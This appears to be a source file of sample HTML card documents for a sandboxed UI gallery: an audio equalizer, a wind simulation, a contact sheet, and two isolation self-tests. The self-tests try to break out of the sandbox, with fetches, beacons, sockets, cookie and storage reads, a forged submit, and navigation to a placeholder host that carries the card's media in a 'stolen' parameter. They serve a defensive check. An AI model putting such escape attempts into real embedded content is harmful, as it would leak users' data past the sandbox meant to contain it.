/*
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at https://mozilla.org/MPL/2.0/.
 */

/**
 * The documents of the gallery's `html` cards, each as the agent would write one for `show_ui`:
 * markup with its style and script inline, talking to the page through `window.moody` alone.
 *
 * - {@link EQ_DOCUMENT} shapes a cue with three bands of equalization made by the Web Audio API:
 *   it reads the clip's bytes through `moody.load`, draws its waveform and the curve of the
 *   filters, and plays it through them.
 * - {@link LANTERNS_DOCUMENT} is a simulation, lanterns carried on a field of wind, with nothing
 *   of the catalog in it: the point is that arbitrary code runs.
 * - {@link CONTACT_DOCUMENT} is a contact sheet whose own gesture is the answer: a click chooses a
 *   frame for the lock-in button, and a double-click or Enter sends it at once (`moody.submit`).
 *   Its pictures are the card's files, loaded by their addresses in `moody.media`.
 * - {@link ISOLATION_DOCUMENT} is the frame's self-test. It tries every way out of the sandbox a
 *   hostile document might (the network, the page, storage, navigation) and lists what became of
 *   each, which is how the gallery shows, and the end-to-end check asserts, that none works.
 * - {@link RUNAWAY_DOCUMENT} does the one thing the self-test can only do in a frame of its own:
 *   it navigates itself away, carrying what it was given in the address. The shell refuses the
 *   navigation, and the card says the document stopped.
 *
 * Each uses the theme's variables and leaves its controls to the frame's base sheet, so it looks
 * like the conversation; each stops moving, or does not start, where the person asked for less
 * motion; and each takes `moody.locked` to mean its controls are for reading only.
 * @module
 */

/** A cue under three bands of equalization. */
export const EQ_DOCUMENT = `
<style>
  .eq { display: grid; gap: 12px; }
  canvas { display: block; width: 100%; border: 1px solid var(--moody-line); border-radius: 8px; background: var(--moody-bg); }
  #wave { height: 84px; cursor: pointer; }
  #curve { height: 120px; }
  .bar { display: flex; align-items: center; gap: 12px; }
  .bar span { color: var(--moody-muted); font-size: 12px; }
  .bands { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 14px; }
  .band { display: grid; gap: 4px; }
  .band div { display: flex; justify-content: space-between; align-items: baseline; }
  output { font-family: var(--moody-mono); font-size: 12px; color: var(--moody-fg); }
  @media (max-width: 420px) { .bands { grid-template-columns: minmax(0, 1fr); } }
</style>
<div class="eq">
  <canvas id="wave" role="img" aria-label="The cue's waveform"></canvas>
  <div class="bar">
    <button id="play" type="button">Play</button>
    <span id="status">Reading the cue…</span>
  </div>
  <canvas id="curve" role="img" aria-label="The equalizer's curve"></canvas>
  <div class="bands">
    <div class="band"><div><label for="low">Low · 120 Hz</label><output id="low-out"></output></div>
      <input id="low" type="range" min="-12" max="12" step="0.5"></div>
    <div class="band"><div><label for="mid">Mid · 1 kHz</label><output id="mid-out"></output></div>
      <input id="mid" type="range" min="-12" max="12" step="0.5"></div>
    <div class="band"><div><label for="high">High · 6 kHz</label><output id="high-out"></output></div>
      <input id="high" type="range" min="-12" max="12" step="0.5"></div>
  </div>
</div>
<script>
  const BANDS = [
    { id: 'low', type: 'lowshelf', frequency: 120 },
    { id: 'mid', type: 'peaking', frequency: 1000 },
    { id: 'high', type: 'highshelf', frequency: 6000 },
  ];
  const state = Object.assign({ low: 3, mid: -2, high: 4 }, moody.state || {});
  const token = (name) => getComputedStyle(document.documentElement).getPropertyValue(name).trim();
  const wave = document.getElementById('wave');
  const curve = document.getElementById('curve');
  const play = document.getElementById('play');
  const status = document.getElementById('status');
  // The curve is computed by real filters of a context that never plays.
  const bench = new OfflineAudioContext(1, 1, 44100);
  const shapes = BANDS.map((band) => Object.assign(bench.createBiquadFilter(), { type: band.type }));
  let buffer = null, peaks = [], context = null, source = null, live = [], startedAt = 0;

  function fit(canvas) {
    const ratio = window.devicePixelRatio || 1;
    const box = canvas.getBoundingClientRect();
    canvas.width = Math.round(box.width * ratio);
    canvas.height = Math.round(box.height * ratio);
    const pen = canvas.getContext('2d');
    pen.setTransform(ratio, 0, 0, ratio, 0, 0);
    return [pen, box.width, box.height];
  }

  function drawWave() {
    const [pen, width, height] = fit(wave);
    pen.clearRect(0, 0, width, height);
    const played = source && buffer ? ((context.currentTime - startedAt) % buffer.duration) / buffer.duration : 0;
    const step = width / Math.max(peaks.length, 1);
    peaks.forEach((peak, index) => {
      pen.fillStyle = (index + 0.5) / peaks.length <= played ? token('--moody-fg') : token('--moody-line-strong');
      const tall = Math.max(2, peak * (height - 12));
      pen.fillRect(index * step + step * 0.2, (height - tall) / 2, step * 0.6, tall);
    });
  }

  function drawCurve() {
    const [pen, width, height] = fit(curve);
    pen.clearRect(0, 0, width, height);
    const points = 160;
    const frequencies = new Float32Array(points).map((_, index) => 20 * Math.pow(1000, index / (points - 1)));
    const total = new Float32Array(points).fill(1);
    shapes.forEach((shape, index) => {
      shape.frequency.value = BANDS[index].frequency;
      shape.gain.value = state[BANDS[index].id];
      const magnitude = new Float32Array(points), phase = new Float32Array(points);
      shape.getFrequencyResponse(frequencies, magnitude, phase);
      magnitude.forEach((value, at) => { total[at] *= value; });
    });
    const y = (decibels) => height / 2 - (decibels / 15) * (height / 2 - 8);
    pen.strokeStyle = token('--moody-line');
    pen.lineWidth = 1;
    [-12, 0, 12].forEach((mark) => { pen.beginPath(); pen.moveTo(0, y(mark)); pen.lineTo(width, y(mark)); pen.stroke(); });
    pen.fillStyle = token('--moody-faint');
    pen.font = '10px ' + token('--moody-mono');
    pen.fillText('+12 dB', 6, y(12) + 12); pen.fillText('0', 6, y(0) - 4); pen.fillText('-12 dB', 6, y(-12) - 4);
    pen.beginPath();
    total.forEach((value, index) => {
      const at = [index / (points - 1) * width, y(20 * Math.log10(value))];
      if (index === 0) pen.moveTo(at[0], at[1]); else pen.lineTo(at[0], at[1]);
    });
    pen.strokeStyle = token('--moody-lime');
    pen.lineWidth = 2;
    pen.lineJoin = 'round';
    pen.stroke();
  }

  function apply() {
    BANDS.forEach((band, index) => {
      document.getElementById(band.id).value = state[band.id];
      document.getElementById(band.id + '-out').textContent = (state[band.id] > 0 ? '+' : '') + state[band.id] + ' dB';
      if (live[index]) live[index].gain.value = state[band.id];
    });
    drawCurve();
  }

  function stop() {
    if (source) { source.stop(); source = null; }
    play.textContent = 'Play';
    drawWave();
  }

  function start() {
    context = context || new AudioContext();
    live = BANDS.map((band) => Object.assign(context.createBiquadFilter(), { type: band.type }));
    live.forEach((filter, index) => { filter.frequency.value = BANDS[index].frequency; filter.gain.value = state[BANDS[index].id]; });
    source = Object.assign(context.createBufferSource(), { buffer, loop: true });
    [source, ...live, context.destination].reduce((from, to) => (from.connect(to), to));
    startedAt = context.currentTime;
    source.start();
    play.textContent = 'Stop';
    const tick = () => { if (source) { drawWave(); requestAnimationFrame(tick); } };
    tick();
  }

  BANDS.forEach((band) => {
    const input = document.getElementById(band.id);
    input.disabled = moody.locked;
    input.addEventListener('input', () => { state[band.id] = Number(input.value); apply(); moody.setState(state); });
  });
  play.disabled = true;
  play.addEventListener('click', () => (source ? stop() : start()));
  window.addEventListener('moodylock', () => { BANDS.forEach((band) => { document.getElementById(band.id).disabled = true; }); });
  new ResizeObserver(() => { drawWave(); drawCurve(); }).observe(document.body);
  apply();
  moody.setState(state);

  moody.load('cue').then((bytes) => bench.decodeAudioData(bytes)).then((decoded) => {
    buffer = decoded;
    const samples = decoded.getChannelData(0), bars = 120, size = Math.floor(samples.length / bars);
    peaks = Array.from({ length: bars }, (_, bar) => {
      let peak = 0;
      for (let at = bar * size; at < (bar + 1) * size; at += 1) peak = Math.max(peak, Math.abs(samples[at]));
      return peak;
    });
    const loudest = Math.max.apply(null, peaks) || 1;
    peaks = peaks.map((peak) => peak / loudest);
    play.disabled = false;
    status.textContent = decoded.duration.toFixed(1) + ' s, looping through the equalizer';
    drawWave();
  }).catch((error) => { status.textContent = 'The cue could not be read: ' + error.message; });
</script>
`;

/** Lanterns carried on a field of wind. */
export const LANTERNS_DOCUMENT = `
<style>
  .sim { display: grid; gap: 12px; }
  canvas { display: block; width: 100%; aspect-ratio: 16 / 9; border: 1px solid var(--moody-line); border-radius: 8px; background: #06050d; }
  .controls { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 14px; }
  .control { display: grid; gap: 4px; }
  .control div { display: flex; justify-content: space-between; align-items: baseline; }
  output { font-family: var(--moody-mono); font-size: 12px; }
  .bar { display: flex; align-items: center; gap: 12px; }
  .bar span { color: var(--moody-muted); font-size: 12px; }
  @media (max-width: 420px) { .controls { grid-template-columns: minmax(0, 1fr); } }
</style>
<div class="sim">
  <canvas id="sky" role="img" aria-label="Lanterns drifting on the wind"></canvas>
  <div class="controls">
    <div class="control"><div><label for="count">Lanterns</label><output id="count-out"></output></div>
      <input id="count" type="range" min="20" max="400" step="10"></div>
    <div class="control"><div><label for="wind">Wind</label><output id="wind-out"></output></div>
      <input id="wind" type="range" min="0" max="100"></div>
    <div class="control"><div><label for="lift">Lift</label><output id="lift-out"></output></div>
      <input id="lift" type="range" min="0" max="100"></div>
  </div>
  <div class="bar">
    <button id="run" type="button">Pause</button>
    <span id="note">Each lantern follows the wind field and rises on its own heat.</span>
  </div>
</div>
<script>
  const state = Object.assign({ count: 160, wind: 45, lift: 35 }, moody.state || {});
  const canvas = document.getElementById('sky');
  const pen = canvas.getContext('2d');
  const calm = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
  const run = document.getElementById('run');
  let lanterns = [], running = !calm, clock = 0, width = 0, height = 0;

  // A small seeded generator, so the same settings always draw the same sky.
  let seed = 20260;
  const random = () => { seed = (seed * 1664525 + 1013904223) % 4294967296; return seed / 4294967296; };
  const lantern = () => ({ x: random(), y: random(), size: 1.5 + random() * 2.5, heat: 0.5 + random(), phase: random() * 6.28, warm: random() < 0.8 });

  // The wind: two crossed waves that drift, which turn smoothly in space and time without a noise table.
  const wind = (x, y, t) => [
    Math.sin(y * 5.1 + t * 0.6) + 0.6 * Math.sin((x + y) * 3.3 - t * 0.4),
    0.5 * Math.cos(x * 4.7 - t * 0.5) + 0.3 * Math.sin(x * 9.1 + t * 0.9),
  ];

  function size() {
    const ratio = window.devicePixelRatio || 1;
    const box = canvas.getBoundingClientRect();
    width = box.width; height = box.height;
    canvas.width = Math.round(width * ratio); canvas.height = Math.round(height * ratio);
    pen.setTransform(ratio, 0, 0, ratio, 0, 0);
  }

  function step(seconds) {
    clock += seconds;
    while (lanterns.length < state.count) lanterns.push(lantern());
    lanterns.length = state.count;
    lanterns.forEach((one) => {
      const [gustX, gustY] = wind(one.x, one.y, clock);
      one.x += (gustX * state.wind / 100 * 0.06) * seconds;
      one.y += (gustY * state.wind / 100 * 0.04 - one.heat * state.lift / 100 * 0.05) * seconds;
      if (one.y < -0.05) { one.y = 1.05; one.x = random(); }
      if (one.x < -0.05) one.x = 1.05;
      if (one.x > 1.05) one.x = -0.05;
    });
  }

  function draw() {
    pen.globalCompositeOperation = 'source-over';
    pen.fillStyle = 'rgba(6, 5, 13, 0.35)';
    pen.fillRect(0, 0, width, height);
    pen.globalCompositeOperation = 'lighter';
    lanterns.forEach((one) => {
      const flicker = 0.75 + 0.25 * Math.sin(clock * 5 + one.phase);
      const x = one.x * width, y = one.y * height, glow = one.size * 5;
      const light = pen.createRadialGradient(x, y, 0, x, y, glow);
      light.addColorStop(0, one.warm ? 'rgba(255, 190, 110, ' + 0.9 * flicker + ')' : 'rgba(198, 192, 245, ' + 0.8 * flicker + ')');
      light.addColorStop(1, 'rgba(0, 0, 0, 0)');
      pen.fillStyle = light;
      pen.fillRect(x - glow, y - glow, glow * 2, glow * 2);
    });
  }

  function show() {
    ['count', 'wind', 'lift'].forEach((name) => {
      document.getElementById(name).value = state[name];
      document.getElementById(name + '-out').textContent = state[name];
    });
  }

  let last = 0;
  function frame(now) {
    if (running) { step(Math.min((now - last) / 1000, 0.05)); draw(); }
    last = now;
    requestAnimationFrame(frame);
  }

  ['count', 'wind', 'lift'].forEach((name) => {
    const input = document.getElementById(name);
    input.disabled = moody.locked;
    input.addEventListener('input', () => {
      state[name] = Number(input.value);
      show();
      moody.setState(state);
      if (!running) { step(0); draw(); }
    });
  });
  run.textContent = running ? 'Pause' : 'Play';
  run.addEventListener('click', () => { running = !running; run.textContent = running ? 'Pause' : 'Play'; });
  window.addEventListener('moodylock', () => { ['count', 'wind', 'lift'].forEach((name) => { document.getElementById(name).disabled = true; }); });
  new ResizeObserver(() => { size(); draw(); }).observe(canvas);
  size(); show(); moody.setState(state);
  // Where less motion was asked for, the sky is settled out of sight and shown still, with Play to start it.
  for (let warm = 0; warm < 240; warm += 1) step(1 / 30);
  for (let trail = 0; trail < 12; trail += 1) { step(1 / 30); draw(); }
  requestAnimationFrame((now) => { last = now; requestAnimationFrame(frame); });
</script>
`;

/** Every way out of the frame a document might try, and what became of each. */
export const ISOLATION_DOCUMENT = `
<style>
  table { width: 100%; border-collapse: collapse; font-size: 12.5px; }
  th, td { padding: 5px 8px; border-top: 1px solid var(--moody-line); text-align: left; }
  thead th { border-top: 0; color: var(--moody-faint); font-family: var(--moody-mono); font-size: 11px; font-weight: 500; letter-spacing: .08em; text-transform: uppercase; }
  td:last-child { font-family: var(--moody-mono); }
  .held { color: var(--moody-ok); }
  .leak { color: var(--moody-bad); font-weight: 700; }
  p { margin: 0 0 10px; color: var(--moody-muted); font-size: 12.5px; }
</style>
<p id="summary">Trying every way out…</p>
<table><thead><tr><th>The document tries to</th><th>What happened</th></tr></thead><tbody id="rows"></tbody></table>
<script>
  // A host that exists nowhere: if any of this ever left the frame, the browser would be seen asking for it.
  const OUT = 'https://moody-probe.invalid/';
  const results = [];
  const violations = [];
  document.addEventListener('securitypolicyviolation', (event) => { violations.push(event.effectiveDirective); });
  const settle = (milliseconds) => new Promise((resolve) => setTimeout(resolve, milliseconds));
  const thrown = (attempt) => { try { return 'REACHED: ' + attempt(); } catch (error) { return 'refused (' + error.name + ')'; } };
  // What the policy refuses, it reports: an attempt is refused when its directive is violated once more than before.
  const policed = async (directive, attempt) => {
    const before = violations.filter((one) => one === directive).length;
    try { await attempt(); } catch (error) { /* A refusal may also throw; the report decides. */ }
    await settle(150);
    return violations.filter((one) => one === directive).length > before ? 'refused (policy: ' + directive + ')' : 'REACHED';
  };
  const element = (name, set) => { const made = document.createElement(name); made.hidden = true; set(made); document.body.append(made); };

  const attempts = [
    ['fetch an address', () => policed('connect-src', () => fetch(OUT + 'fetch', { mode: 'no-cors' }))],
    ['send a beacon', () => policed('connect-src', () => navigator.sendBeacon(OUT + 'beacon', 'x'))],
    ['open a socket', () => policed('connect-src', () => new WebSocket('wss://moody-probe.invalid/socket'))],
    ['load a remote picture', () => policed('img-src', () => { new Image().src = OUT + 'picture.png'; })],
    ['load a remote script', () => policed('script-src-elem', () => element('script', (script) => { script.src = OUT + 'script.js'; }))],
    ['load a remote style', () => policed('style-src-elem', () => element('link', (link) => { link.rel = 'stylesheet'; link.href = OUT + 'style.css'; }))],
    ['embed another page', () => policed('frame-src', () => element('iframe', (inner) => { inner.src = OUT + 'frame'; }))],
    ['start a worker', () => policed('worker-src', () => new Worker(URL.createObjectURL(new Blob(['fetch("' + OUT + 'worker")']))))],
    ['read the page it is in', async () => thrown(() => window.parent.parent.document.title)],
    ['read the page’s address', async () => thrown(() => window.top.location.href)],
    ['read the page’s storage', async () => thrown(() => window.localStorage.length)],
    ['read the page’s cookies', async () => thrown(() => document.cookie)],
    ['open a window', async () => (window.open(OUT + 'window') === null ? 'refused (no window)' : 'REACHED')],
    ['navigate the tab away', async () => thrown(() => { window.top.location.href = OUT + 'top'; return 'the tab'; })],
    ['submit a form', async () => { element('form', (form) => { form.action = OUT + 'form'; }); document.forms[0].submit(); await settle(150); return 'refused (still here)'; }],
    ['answer for the person', async () => { moody.submit({ forged: true }); window.parent.parent.postMessage({ moodyCard: 'someone-else', type: 'submit', value: { forged: true } }, '*'); await settle(150); return moody.locked ? 'REACHED' : 'ignored (the person is not in the card)'; }],
    // In a frame of its own: a document that navigates is unloaded whether or not it gets anywhere, and this one has a report to finish.
    ['leave by navigating away', () => policed('frame-src', () => element('iframe', (inner) => { inner.srcdoc = '<script>location.href = "' + OUT + 'leave?state=stolen";<\\/script>'; }))],
  ];

  (async () => {
    const rows = document.getElementById('rows');
    for (const [name, attempt] of attempts) {
      let outcome;
      try { outcome = await Promise.race([attempt(), settle(1500).then(() => 'no answer')]); } catch (error) { outcome = 'refused (' + error.name + ')'; }
      results.push({ name, outcome, held: !outcome.startsWith('REACHED') });
      const row = rows.insertRow();
      row.insertCell().textContent = name;
      const cell = row.insertCell();
      cell.textContent = outcome;
      cell.className = outcome.startsWith('REACHED') ? 'leak' : 'held';
      moody.setState({ done: false, results });
    }
    const leaks = results.filter((one) => !one.held).map((one) => one.name);
    document.getElementById('summary').textContent = leaks.length === 0
      ? 'All ' + results.length + ' ways out are closed.'
      : leaks.length + ' of ' + results.length + ' got out: ' + leaks.join(', ') + '.';
    moody.setState({ done: true, held: results.length - leaks.length, leaks, results });
  })();
</script>
`;

/** A document that tries to leave its frame with what it was given. */
export const RUNAWAY_DOCUMENT = `
<p style="margin: 0; color: var(--moody-muted)">This document is about to navigate itself away…</p>
<script>
  setTimeout(() => {
    window.location.href = 'https://moody-probe.invalid/leave?stolen=' + encodeURIComponent(JSON.stringify(moody.media));
  }, 600);
</script>
`;

/** A contact sheet: click a frame to choose it, double-click to send it. */
export const CONTACT_DOCUMENT = `
<style>
  .sheet { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 8px; }
  .sheet button { position: relative; height: auto; padding: 0; overflow: hidden; aspect-ratio: 3 / 2; background: var(--moody-bg); }
  .sheet img { display: block; width: 100%; height: 100%; object-fit: cover; }
  .sheet button[aria-pressed="true"] { border-color: var(--moody-lime); box-shadow: 0 0 0 1px var(--moody-lime); }
  .sheet span { position: absolute; left: 6px; bottom: 6px; padding: 1px 6px; border-radius: 4px; background: rgba(8, 8, 8, 0.78); font: 11px var(--moody-mono); }
  p { margin: 10px 0 0; color: var(--moody-muted); font-size: 12px; }
  @media (max-width: 420px) { .sheet { grid-template-columns: repeat(2, minmax(0, 1fr)); } }
</style>
<div class="sheet" id="sheet"></div>
<p>Click a frame to choose it. Double-click it, or press Enter on it, to send it straight to print.</p>
<script>
  const sheet = document.getElementById('sheet');
  let chosen = moody.state ? moody.state.frame : null;
  const show = () => Array.from(sheet.children).forEach((button) => button.setAttribute('aria-pressed', String(button.dataset.name === chosen)));
  Object.keys(moody.media).forEach((name, index) => {
    const button = document.createElement('button');
    button.type = 'button';
    button.dataset.name = name;
    button.disabled = moody.locked;
    const picture = document.createElement('img');
    picture.src = moody.media[name];
    picture.alt = 'Frame ' + (index + 1) + ': ' + name;
    const tag = document.createElement('span');
    tag.textContent = String(index + 1).padStart(2, '0');
    button.append(picture, tag);
    button.addEventListener('click', () => { chosen = name; show(); moody.setState({ frame: name }); });
    button.addEventListener('dblclick', () => moody.submit({ frame: name }));
    button.addEventListener('keydown', (event) => { if (event.key === 'Enter') { event.preventDefault(); moody.submit({ frame: name }); } });
    sheet.append(button);
  });
  window.addEventListener('moodylock', () => Array.from(sheet.children).forEach((button) => { button.disabled = true; }));
  show();
</script>
`;
